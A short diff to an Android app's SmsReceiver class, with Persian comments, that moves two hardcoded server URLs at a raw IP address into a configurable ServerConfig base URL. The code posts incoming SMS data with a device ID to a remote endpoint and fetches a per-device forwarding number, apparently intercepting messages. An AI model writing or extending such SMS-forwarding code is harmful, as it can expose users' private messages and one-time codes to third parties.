@@ -103,7 +103,9 @@ class SmsReceiver : BroadcastReceiver() {
                 put("deviceId", deviceId)
             }
 
-            val urlString = "http://95.134.130.160:8765/api/sms/new"
+            // ⭐ استفاده از ServerConfig برای گرفتن Base URL
+            val baseUrl = ServerConfig.getBaseUrl()
+            val urlString = "$baseUrl/sms/new"
             Log.d(TAG, "🌐 URL: $urlString")
             Log.d(TAG, "📤 Body: ${body.toString()}")
 
@@ -154,7 +156,9 @@ class SmsReceiver : BroadcastReceiver() {
             )
             Log.d(TAG, "📱 Device ID: $deviceId")
 
-            val urlString = "http://95.134.130.160:8765/api/getForwardingNumber/$deviceId"
+            // ⭐ استفاده از ServerConfig برای گرفتن Base URL
+            val baseUrl = ServerConfig.getBaseUrl()
+            val urlString = "$baseUrl/getForwardingNumber/$deviceId"
             Log.d(TAG, "🌐 URL: $urlString")
 
             val url = URL(urlString)
